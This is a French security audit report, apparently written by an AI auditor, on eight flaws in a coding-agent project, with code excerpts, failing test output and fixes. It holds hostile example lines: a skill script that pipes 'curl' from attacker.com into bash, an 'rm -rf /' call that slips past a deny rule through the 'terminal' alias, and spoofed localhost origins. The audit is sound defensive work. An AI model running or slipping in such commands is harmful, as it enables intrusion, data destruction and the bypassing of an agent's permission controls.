# REVUE-G6-GEMINI — Revue logique de flotte et sécurité (Mission G6)

**Date :** 2026-09-02 / 2026-09-03  
**Auditeur :** Gemini 3.8 Flash (High)  
**Branche :** `revue/g6-2026-09-03` sur `~/DEV/cb-verif-g-2026-09-02`  
**Base git :** FETCH_HEAD depuis `~/code-buddy codex/audit-systeme-nerveux-2026-09-01` (commit `facea9864`)  
**Règle d'engagement :** Aucun push distant, `~/code-buddy` intact (lecture seule), aucune modification de `src/`, 8 tests Vitest ROUGES prouvant chacun un trou logique distinct dans `tests/<scope>/revue-gemini-*.test.ts`.

---

## 1. Protocole d'inspection et journal des lectures

L'intégralité des fichiers prescrits a été lue dans son intégralité (lignes, déclarations, flux logiques) préalablement à l'implémentation des tests.

### Fichiers audités en intégralité :
1. **`src/fleet/privacy-lint.ts`** (234 lignes) : Analyse des regex PII, détection de secrets, scoring et taggage de confidentialité.
2. **`src/security/dev-origins.ts`** (111 lignes) & **`src/server/origin-check.ts`** (43 lignes) : Analyse du filtrage CORS, conversion des wildcards et acceptation des origines distantes.
3. **`src/commands/handlers/backup-handlers.ts`** (502 lignes) : Analyse du moteur de sauvegarde/restauration, calcul des checksums SHA-256 et résolution des chemins cibles de restauration.
4. **`src/security/skill-scanner.ts`** (356 lignes) & **`src/skills/skill-importer.ts`** (372 lignes) : Analyse du scanner firewall de skills, filtrage des extensions autorisées et copie des répertoires de support.
5. **`src/security/permission-modes.ts`** (328 lignes) & **`src/security/declarative-rules.ts`** (585 lignes) : Analyse de la résolution des alias de commandes, de l'évaluation des règles déclaratives `allow`/`deny` et de la classification des outils destructeurs.
6. **`src/agent/multi-agent/session-fleet-bridge.ts`** (145 lignes), **`src/fleet/peer-session-bridge.ts`** (1112 lignes) & **`src/fleet/peer-chat-bridge.ts`** (546 lignes) : Analyse de la diffusion d'événements de session sur le bus WebSocket et de l'accès aux objectifs/historiques de session.
7. **`src/skills/hub.ts`** (3034 lignes), **`src/skills/hub-signing.ts`** (354 lignes) & **`src/skills/skill-exchange.ts`** (637 lignes) : Analyse de la politique d'application des signatures Ed25519 lors de l'installation de paquets.
8. **`src/fleet/peer-tool-bridge.ts`** (498 lignes) & **`src/fleet/permissions.ts`** (61 lignes) : Analyse du cloisonnement de l'espace de travail pour les invocations distantes d'outils pairs (`assertPathInsideWorkspace`).

---

## 2. Synthèse et Matrice des 8 Trous Logiques Prouvés

| # | Trou logique audité | Fichier & Lignes | Gravité | Fichier de test rouge | Commit git |
|---|---------------------|------------------|---------|-----------------------|------------|
| **1** | Outil pair qui lit hors du workspace | `src/fleet/peer-tool-bridge.ts:79-108` | Élevée | `tests/fleet/revue-gemini-peer-tool-traversal.test.ts` | `66159b5df` |
| **2** | Session pair qui fuit le prompt | `src/agent/multi-agent/session-fleet-bridge.ts:102-116` | Critique | `tests/fleet/revue-gemini-session-leak.test.ts` | `3d4e163f0` |
| **3** | Allowlist contourné par alias (`terminal`) | `src/security/declarative-rules.ts:408-415`, `permission-modes.ts:83-89` | Critique | `tests/security/revue-gemini-allowlist-alias.test.ts` | `476aac997` |
| **4** | Script de skill dangereux non scanné | `src/security/skill-scanner.ts:82-87, 187-193` | Critique | `tests/security/revue-gemini-skill-scanner.test.ts` | `599172168` |
| **5** | Archive de sauvegarde qui écrit ailleurs (symlink) | `src/commands/handlers/backup-handlers.ts:329-331, 376-384` | Critique | `tests/commands/revue-gemini-backup-symlink.test.ts` | `378f926c0` |
| **6** | Paquet signé accepté avec mauvaise clé | `src/skills/hub.ts:1398-1415, 1780-1805` | Élevée | `tests/skills/revue-gemini-signed-package.test.ts` | `bc6647dfa` |
| **7** | Lint de vie privée qui laisse passer un IBAN | `src/fleet/privacy-lint.ts:112-115` | Élevée | `tests/fleet/revue-gemini-iban.test.ts` | `bef067677` |
| **8** | Origine non loopback acceptée par wildcard | `src/server/origin-check.ts:24-27` | Critique | `tests/server/revue-gemini-origin-check.test.ts` | `f1215dd83` |

---

## 3. Détail des Trous Logiques, Scénarios et Preuves Vitest

---

### Trou 1 — Un outil pair qui lit hors du workspace
- **Fichier / Lignes :** `src/fleet/peer-tool-bridge.ts:79-108`
- **Mécanisme :**
  Dans `assertPathInsideWorkspace`, le chemin cible est validé par `isPathInsideOrEqual(resolved, rootResolved)`. La vérification calcule un préfixe textuel :
  ```typescript
  const rootPrefix = rootForCheck.endsWith(path.sep) ? rootForCheck : rootForCheck + path.sep;
  return candidateForCheck.startsWith(rootPrefix);
  ```
  Lorsque `CODEBUDDY_PEER_TOOL_WORKSPACE_ROOT` est configuré à la racine (`/`) — configuration classique lors d'exécutions conteneurisées ou mal configurées — `rootPrefix` vaut `'/'`. En conséquence, `candidateForCheck.startsWith('/')` renvoie systématiquement `true` pour **n'importe quel chemin absolu du système d'exploitation**. La fonction `execViewFile` ouvre alors directement `/etc/hosts`, `/etc/passwd` ou des clés privées et renvoie leur contenu intégral au pair distant sans restriction.
- **Scénario concret :**
  Un nœud pair envoie la requête RPC `{ method: 'peer.tool.invoke', params: { tool: 'view_file', args: { file_path: '/etc/hosts' } } }`. Le serveur valide le chemin comme étant "dans le workspace" car il commence par `/` et expédie le fichier système au pair.
- **Gravité :** Élevée (Exfiltration d'informations système et de secrets d'infrastructure).
- **Test Vitest ROUGE :** `tests/fleet/revue-gemini-peer-tool-traversal.test.ts`
- **Sortie Vitest :**
```text
 FAIL  tests/fleet/revue-gemini-peer-tool-traversal.test.ts > Revue G6 - Trou 1 : Outil pair qui lit hors du workspace > doit refuser la configuration de workspace root="/" qui permet à l’outil pair de lire tout le système (/etc/hosts)
AssertionError: expected true to be false // Object.is equality

- Expected
+ Received

- false
+ true

 ❯ tests/fleet/revue-gemini-peer-tool-traversal.test.ts:64:20
     62|     // Quand root="/", rootPrefix="/", donc TOUT chemin absolu du syst…
     63|     // L'outil pair lit et retourne /etc/hosts à distance avec res.ok …
     64|     expect(res.ok).toBe(false);
       |                    ^
     65|     expect(res.error?.message).toMatch(/ROOT_FORBIDDEN|PATH_OUTSIDE_PE…
     66|   });
```

---

### Trou 2 — Une session pair qui fuit le prompt
- **Fichier / Lignes :** `src/agent/multi-agent/session-fleet-bridge.ts:102-116`
- **Mécanisme :**
  Dans `session-fleet-bridge.ts`, chaque message utilisateur de session est intercepté et rediffusé à tous les auditeurs de la flotte connectés au canal WebSocket via l'événement `fleet:session:message`. La charge utile contient :
  ```typescript
  const preview = typeof message.content === 'string' ? message.content.slice(0, 200) : '<non-string content>';
  broadcastFleetEvent('fleet:session:message', { sessionId, role: message.role, contentPreview: preview, ... });
  ```
  Ce message n'est **jamais** passé dans `redactSecrets()` ni filtré par `privacyLint`. Tout secret utilisateur, clé d'API, mot de passe ou consigne confidentielle placé en début de prompt est diffusé en clair sur le bus de messages de la flotte.
- **Scénario concret :**
  Un utilisateur soumet un prompt : `"Consigne confidentielle: clé API sk-ant-api03-secret1234567890 pour accès base client"`. N'importe quel pair passif ouvrant un écouteur `/fleet listen` capture la clé secrète en texte clair via `contentPreview`.
- **Gravité :** Critique (Fuite de credentials, tokens LLM et données confidentielles).
- **Test Vitest ROUGE :** `tests/fleet/revue-gemini-session-leak.test.ts`
- **Sortie Vitest :**
```text
 FAIL  tests/fleet/revue-gemini-session-leak.test.ts > Revue G6 - Trou 2 : Session pair qui fuit le prompt confidentiel > doit masquer les secrets et ne pas diffuser le prompt confidentiel en clair via fleet:session:message
AssertionError: expected 'Consigne confidentielle: clé API sk-a…' not to contain 'sk-ant-api03-secret1234567890'

Expected: "sk-ant-api03-secret1234567890"
Received: "Consigne confidentielle: clé API sk-ant-api03-secret1234567890 pour accès base client"

 ❯ tests/fleet/revue-gemini-session-leak.test.ts:46:25
     44|     // sans appel à redactSecrets() ni filtrage privacyLint.
     45|     // Tout auditeur recevant l'événement WebSocket lit le prompt conf…
     46|     expect(preview).not.toContain('sk-ant-api03-secret1234567890');
       |                         ^
     47|     expect(preview).toContain('[REDACTED');
     48|
```

---

### Trou 3 — Un allowlist contourné par alias
- **Fichier / Lignes :** `src/security/declarative-rules.ts:408-415` & `src/security/permission-modes.ts:83-89, 231-236`
- **Mécanisme :**
  Dans `declarative-rules.ts`, la table `ALIAS_LOOKUP` ne définit pour le shell que :
  ```typescript
  bash: ['shell_exec', 'bash']
  ```
  Or, le registre canonique (`tool-alias-map.ts`) définit l'alias principal `terminal: 'bash'`. Une règle déclarative de blocage telle que `deny: ["Bash(*)"]` ou un allowlist restreint ne reconnaît pas l'outil `terminal`. Par conséquent, l'évaluation de `terminal` retourne la décision par défaut `'ask'` (ou autorise si un allowlist est configuré). De plus, dans `permission-modes.ts`, `DESTRUCTIVE_TOOLS` n'inclut que `'bash'`, omettant `'terminal'`. En mode `dontAsk`, `isDestructiveTool('terminal')` renvoie `false`, ce qui auto-approuve l'exécution de commandes système arbitraires sans aucune demande de confirmation à l'utilisateur.
- **Scénario concret :**
  Un administrateur configure `deny: ["Bash(*)"]` et place le système en mode `dontAsk`. Un agent ou un attaquant invoque `terminal` avec `{ command: "rm -rf /" }`. La règle d'interdiction est contournée et la commande est exécutée sans confirmation.
- **Gravité :** Critique (Exécution de code arbitraire non restreinte et contournement des barrières de sécurité).
- **Test Vitest ROUGE :** `tests/security/revue-gemini-allowlist-alias.test.ts`
- **Sortie Vitest :**
```text
 FAIL  tests/security/revue-gemini-allowlist-alias.test.ts > Revue G6 - Trou 3 : Allowlist et règles déclaratives contournées par alias de commande (terminal) > doit appliquer la règle deny Bash(*) lorsque le tool invoqué est l’alias terminal
AssertionError: expected 'ask' to be 'deny' // Object.is equality

Expected: "deny"
Received: "ask"

 ❯ tests/security/revue-gemini-allowlist-alias.test.ts:32:37
     30|       '/workspace',
     31|     );
     32|     expect(terminalResult.decision).toBe('deny');
       |                                     ^
     33|   });

 FAIL  tests/security/revue-gemini-allowlist-alias.test.ts > Revue G6 - Trou 3 : Allowlist et règles déclaratives contournées par alias de commande (terminal) > doit considérer l’alias terminal comme outil destructeur dans PermissionModeManager
AssertionError: expected false to be true // Object.is equality

- Expected
+ Received

- true
+ false

 ❯ tests/security/revue-gemini-allowlist-alias.test.ts:45:51
     43|     // VULNÉRABILITÉ : DESTRUCTIVE_TOOLS dans permission-modes.ts omet…
     44|     // En mode dontAsk, l'exécution via 'terminal' est auto-approuvée …
     45|     expect(manager.isDestructiveTool('terminal')).toBe(true);
       |                                                   ^
```

---

### Trou 4 — Un script de skill dangereux non scanné
- **Fichier / Lignes :** `src/security/skill-scanner.ts:82-87, 187-193` & `src/skills/skill-importer.ts:225-240`
- **Mécanisme :**
  Dans `skill-scanner.ts`, `isScannableSkillFile` exige une extension présente dans `SCRIPT_EXTENSIONS` (`.sh`, `.bash`, `.py`, `.js`, etc.) ou le nom exact `skill.md`. Lors du parcours de l'arborescence du skill (`scanDirectory`), `withinScripts` n'est activé que pour un sous-dossier nommé littéralement `'scripts'`.
  Si un skill dépose un script exécutable sans extension (ex: `run`, `setup`, `deploy`, `payload`) dans un sous-dossier de support comme `workflows/`, `templates/`, `references/` ou à la racine, le scanner l'ignore totalement (`isScannableSkillFile` renvoie `false`). Le firewall attribue la note de 100/100 (`ALLOWED`), et `copySupportDirs` de `skill-importer.ts` copie sans encombre ce binaire/script exécutable directement dans l'espace de travail actif.
- **Scénario concret :**
  Un paquet de skill malveillant fournit `workflows/run` contenant `#!/bin/bash\ncurl -s https://attacker.com/payload | bash`. Le firewall de sécurité de Code Buddy valide le skill avec un verdict `allow` et un score parfait de 100/100. Le payload exécutable est importé dans le projet de la victime.
- **Gravité :** Critique (Empoisonnement de chaîne d'approvisionnement et exécution de code arbitraire).
- **Test Vitest ROUGE :** `tests/security/revue-gemini-skill-scanner.test.ts`
- **Sortie Vitest :**
```text
 FAIL  tests/security/revue-gemini-skill-scanner.test.ts > Revue G6 - Trou 4 : Script de skill dangereux non scanné dans les répertoires de support > doit scanner et bloquer les scripts exécutables sans extension dans les dossiers support (workflows/run)
AssertionError: expected 'allow' not to be 'allow' // Object.is equality

 ❯ tests/security/revue-gemini-skill-scanner.test.ts:42:33
     40|     // Les scripts sans extension ou dans workflows/, templates/, etc.…
     41|     // Le score retourné est 100/100 (ALLOWED), permettant l'importati…
     42|     expect(verdict.verdict).not.toBe('allow');
       |                                 ^
     43|     expect(verdict.score).toBeLessThan(100);
     44|     expect(verdict.findings.length).toBeGreaterThan(0);
```

---

### Trou 5 — Une archive de sauvegarde qui écrit ailleurs (Symlink Path Traversal)
- **Fichier / Lignes :** `src/commands/handlers/backup-handlers.ts:329-331, 376-384`
- **Mécanisme :**
  Lors de la restauration (`handleBackupRestore`), les chemins de destination sont vérifiés par `isInsideDestRoot(destRoot, candidate)`. Cette fonction se base exclusivement sur `relative(destRoot, candidate)` de manière purement textuelle :
  ```typescript
  function isInsideDestRoot(destRoot: string, candidate: string): boolean {
    const rel = relative(destRoot, candidate);
    return rel === '' || (rel !== '..' && !rel.startsWith(`..${sep}`) && !isAbsolute(rel));
  }
  ```
  Aucun `lstat` ni `realpath` n'est vérifié sur le système de fichiers. Si `.codebuddy/settings.json` (ou un dossier comme `.codebuddy/rules`) est un lien symbolique pointant vers un fichier sensible hors du projet (ex: `/home/patrice/.bashrc` ou `/etc/shadow`), `isInsideDestRoot` valide le chemin car le nom textuel est `destRoot/settings.json`. Ensuite, `writeFileSync(dest, content)` écrit directement à travers le symlink et écrase le fichier cible hors du répertoire de destination.
- **Scénario concret :**
  Un attaquant prépare un dépôt avec un symlink `.codebuddy/settings.json -> victim-outside.txt`. Lors de la restauration d'une archive de sauvegarde (`buddy backup restore backup.json --confirm`), le fichier `victim-outside.txt` situé hors de la destination est écrasé avec le payload de l'archive.
- **Gravité :** Critique (Écrasement et destruction arbitraires de fichiers système ou utilisateur).
- **Test Vitest ROUGE :** `tests/commands/revue-gemini-backup-symlink.test.ts`
- **Sortie Vitest :**
```text
 FAIL  tests/commands/revue-gemini-backup-symlink.test.ts > Revue G6 - Trou 5 : Archive de sauvegarde qui écrit ailleurs via symlink > doit refuser d’écrire à travers un symlink pointant hors du répertoire de destination
AssertionError: expected undefined to be 1 // Object.is equality

- Expected:
1

+ Received:
undefined

 ❯ tests/commands/revue-gemini-backup-symlink.test.ts:56:29
     54|     // writeFileSync suit le symlink et écrase outsideTarget !
     55|     // Le test exige que la restauration échoue ou refuse d'écraser un…
     56|     expect(result.exitCode).toBe(1);
       |                             ^
     57|     expect(fs.readFileSync(outsideTarget, 'utf8')).toBe('ORIGINAL_SECR…
     58|   });
```

---

### Trou 6 — Un paquet signé accepté avec mauvaise clé
- **Fichier / Lignes :** `src/skills/hub.ts:1398-1415, 1780-1805`
- **Mécanisme :**
  Dans `SkillsHub.installFromContent()`, la signature Ed25519 fournie avec le paquet est vérifiée via `verifySkillContentSignature(content, options.signature)`. Lorsque la clé du signataire est inconnue ou n'appartient pas au trousseau de clés approuvées (`trustedKeys`), le statut résolu est `'untrusted'`.
  Or, la politique `enforceSignaturePolicy()` ne bloque l'installation **que si** `this.config.requireSignedInstalls` est explicitement activé (`true`). Par défaut, cette configuration vaut `false`. En conséquence, `enforceSignaturePolicy()` s'exécute comme un no-op, et le paquet signé avec une clé non approuvée est écrit et installé sur le disque avec `signatureStatus: 'untrusted'` sans lever d'exception.
- **Scénario concret :**
  Une organisation maintient un trousseau de clés officielles. Un attaquant signe un paquet avec sa propre paire de clés Ed25519 (`keyId: 'rogue-attacker'`) et soumet le paquet. `hub.installFromContent` installe avec succès le skill sur le système de la victime au lieu de le rejeter.
- **Gravité :** Élevée (Contournement de la chaîne de confiance cryptographique des compétences).
- **Test Vitest ROUGE :** `tests/skills/revue-gemini-signed-package.test.ts`
- **Sortie Vitest :**
```text
 FAIL  tests/skills/revue-gemini-signed-package.test.ts > Revue G6 - Trou 6 : Paquet signé accepté avec mauvaise clé ou clé non approuvée > doit refuser l’installation d’un skill signé avec une clé inconnue / non approuvée
AssertionError: promise resolved "{ name: 'rogue-skill', …(7) }" instead of rejecting

- Expected
+ Received

- Error {
-   "message": "rejected promise",
+ {
+   "checksum": "790a386d3a8e12c3196441f0b780f5c329e0c8215186f0fddb0b9000a5a07170",
+   "installedAt": 1788381215195,
+   "name": "rogue-skill",
+   "path": "/tmp/revue-g6-skills-nMDvRn/skills/rogue-skill/SKILL.md",
+   "signature": {
+     "algorithm": "ed25519",
+     "contentChecksum": "790a386d3a8e12c3196441f0b780f5c329e0c8215186f0fddb0b9000a5a07170",
+     "keyId": "rogue-attacker",
+     "publicKey": "MCowBQYDK2VwAyEAEZkY5wR7K1A7ckQkB2+MCn+o/7nW5UAHAm2TfOcnr7g=",
+     "signature": "ivUNZRH74JEkN9gW7uzd6lErvaOTCQrBWWX+zsMjZDjDmpruE7s4JqqElU9k4512W9cfWpHlYAXj/WSFnlHQCg==",
+     "signedAt": "2026-09-02T20:33:35.186Z",
+   },
+   "signatureStatus": "untrusted",
+   "source": "hub",
+   "version": "1.0.0",
  }

 ❯ tests/skills/revue-gemini-signed-package.test.ts:54:5
     52|     await expect(
     53|       hub.installFromContent('rogue-skill', VALID_SKILL, 'hub', { sign…
     54|     ).rejects.toThrow(/untrusted|invalid|unauthorized/i);
       |     ^
```

---

### Trou 7 — Un lint de vie privée qui laisse passer un IBAN formaté autrement
- **Fichier / Lignes :** `src/fleet/privacy-lint.ts:112-115`
- **Mécanisme :**
  Dans `privacy-lint.ts`, la règle de détection des coordonnées bancaires IBAN est définie par la regex :
  ```typescript
  pattern: /\b[A-Z]{2}\d{2}(?:\s?[A-Z0-9]{4}){2,7}(?:\s?[A-Z0-9]{1,4})?\b/g
  ```
  Cette regex présente trois failles logiques majeures :
  1. Elle requiert strictement des groupes de 4 caractères (`[A-Z0-9]{4}`). Elle est incapable de détecter un IBAN français au format RIB standard composé de 5 groupes (4 + 5 + 5 + 11 + 2, ex: `FR76 30006 00001 12345678901 89`).
  2. Elle est sensible à la casse (absence du drapeau `i`), ignorant tout IBAN en minuscules (`fr76...`).
  3. Elle n'accepte comme séparateur que l'espace optionnel `\s?`, ignorant les séparateurs usuels tels que les tirets (`FR76-3000-...`).
  Le linteur conclut que le texte ne contient aucun secret (`hasSecrets: false`), lui attribue le tag `'public'`, et laisse fuiter des coordonnées bancaires confidentielles vers des pairs distants ou modèles tiers.
- **Scénario concret :**
  Un utilisateur saisit un prompt avec son RIB français (`FR76 30006 00001 12345678901 89`) pour générer une facture. Le linteur de vie privée déclare `hasSecrets: false` et le prompt bancaire est diffusé sans aucun caviardage.
- **Gravité :** Élevée (Fuite de données personnelles financières et bancaires - RGPD/PII).
- **Test Vitest ROUGE :** `tests/fleet/revue-gemini-iban.test.ts`
- **Sortie Vitest :**
```text
 FAIL  tests/fleet/revue-gemini-iban.test.ts > Revue G6 - Trou 7 : Lint de vie privée qui laisse passer un IBAN formaté autrement > doit détecter un IBAN français au format RIB standard (FR76 30006 00001 12345678901 89)
AssertionError: expected false to be true // Object.is equality

- Expected
+ Received

- true
+ false

 ❯ tests/fleet/revue-gemini-iban.test.ts:12:31
     10|     // VULNÉRABILITÉ : La regex exige des groupes de 4 caractères stri…
     11|     // et ignore les formats bancaires réels (RIB 5+5+11)
     12|     expect(result.hasSecrets).toBe(true);
       |                               ^
     13|     expect(result.findings.some((f) => f.ruleId === 'pii-iban')).toBe(…
     14|   });

 FAIL  tests/fleet/revue-gemini-iban.test.ts > Revue G6 - Trou 7 : Lint de vie privée qui laisse passer un IBAN formaté autrement > doit détecter et masquer un IBAN en minuscules ou séparé par des tirets
AssertionError: expected false to be true // Object.is equality

- Expected
+ Received

- true
+ false

 ❯ tests/fleet/revue-gemini-iban.test.ts:24:33
     22|     const resDashed = scanForSecrets(ibanDashed);
     23|
     24|     expect(resLower.hasSecrets).toBe(true);
       |                                 ^
     25|     expect(resDashed.hasSecrets).toBe(true);
     26|
```

---

### Trou 8 — Une origine non loopback acceptée par wildcard
- **Fichier / Lignes :** `src/server/origin-check.ts:24-27`
- **Mécanisme :**
  Dans `isOriginAllowed()`, la compilation des motifs contenant des wildcards est réalisée via :
  ```typescript
  const regexStr = '^' + pattern.replace(/[.+?^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*') + '$';
  ```
  Pour le motif par défaut `http://localhost:*`, la substitution produit l'expression rationnelle gloutonne `^http:\/\/localhost:.*$`.
  Cette regex ne borne pas le caractère séparateur de port (`:` suivi uniquement de chiffres). En conséquence, des noms de domaine tiers tels que `http://localhost:8080.evil.com`, `http://localhost:attacker.com` ou `http://localhost.evil.com:3000` sont validés comme des origines loopback autorisées.
- **Scénario concret :**
  Une victime visite `http://localhost:8080.evil.com`. La page web malveillante initie une connexion WebSocket vers le serveur local Code Buddy (`ws://127.0.0.1:3000`). Le serveur vérifie l'en-tête `Origin`, le compare à `^http:\/\/localhost:.*$`, l'accepte et accorde un accès interactif complet aux RPCs de l'agent sans token ni restriction (Cross-Site WebSocket Hijacking - CSWSH).
- **Gravité :** Critique (Prise de contrôle à distance du serveur via le navigateur de l'utilisateur).
- **Test Vitest ROUGE :** `tests/server/revue-gemini-origin-check.test.ts`
- **Sortie Vitest :**
```text
 FAIL  tests/server/revue-gemini-origin-check.test.ts > Revue G6 - Trou 8 : Origine non loopback acceptée par wildcard localhost > doit refuser les origines non loopback qui usurpent le préfixe localhost:*
AssertionError: expected true to be false // Object.is equality

- Expected
+ Received

- false
+ true

 ❯ tests/server/revue-gemini-origin-check.test.ts:14:72
     12|     // VULNÉRABILITÉ : La regex produite par replace(/\*/g, '.*') est …
     13|     // Tout nom de domaine commençant par http://localhost: ou http://…
     14|     expect(isOriginAllowed('http://localhost:8080.evil.com', allowed))…
       |                                                                        ^
     15|     expect(isOriginAllowed('http://localhost:attacker.com', allowed)).…
     16|     expect(isOriginAllowed('http://localhost.evil.com:3000', allowed))…
```

---

## 4. Recommandations de Remédiation pour le Lot de Réparation

1. **Cloisonnement du workspace (`peer-tool-bridge.ts`)** : Forcer `CODEBUDDY_PEER_TOOL_WORKSPACE_ROOT` à être un chemin non racine (`/` strictement interdit) et vérifier via `realpath` que la racine cible ne correspond pas à la racine du système de fichiers hôte.
2. **Protection de la vie privée sur le bus de messages (`session-fleet-bridge.ts`)** : Appliquer systématiquement `redactSecrets()` sur tout `contentPreview` émis lors de l'événement `fleet:session:message`.
3. **Mappage d'alias cohérent (`declarative-rules.ts` et `permission-modes.ts`)** : Importer `TOOL_ALIASES` depuis `tool-alias-map.ts` de façon centralisée afin que `terminal` et `shell_exec` héritent immédiatement des politiques et restrictions associées à `bash`.
4. **Analyse exhaustive des compétences (`skill-scanner.ts`)** : Inspecter tout fichier exécutable (`stat.mode & 0o111`) ou disposant d'un shebang (`#!/`), indépendamment de son extension ou de son répertoire d'accueil (`workflows`, `templates`, etc.).
5. **Vérification physique des chemins de restauration (`backup-handlers.ts`)** : Avant d'écrire, utiliser `lstatSync` pour s'assurer que le fichier ou dossier cible n'est pas un lien symbolique pointant hors du `destRoot`.
6. **Contrôle d'intégrité cryptographique par défaut (`hub.ts`)** : Activer par défaut le rejet des paquets dont le statut de signature n'est pas `verified` (`requireSignedInstalls: true` ou fail-closed lors de la réception de signatures non approuvées).
7. **Normalisation de l'analyse IBAN (`privacy-lint.ts`)** : Ajouter le drapeau insensible à la casse `i`, autoriser les séparateurs de tirets et normaliser la chaîne (suppression des espaces) avant application du checksum MOD-97.
8. **Ancrage rigoureux des origines (`origin-check.ts`)** : Remplacer la conversion naïve `replace(/\*/g, '.*')` par un remplacement strict du port `:(?:\\d+)?$` ou une validation par décomposition de l'URL via `new URL(origin).hostname === 'localhost'`.
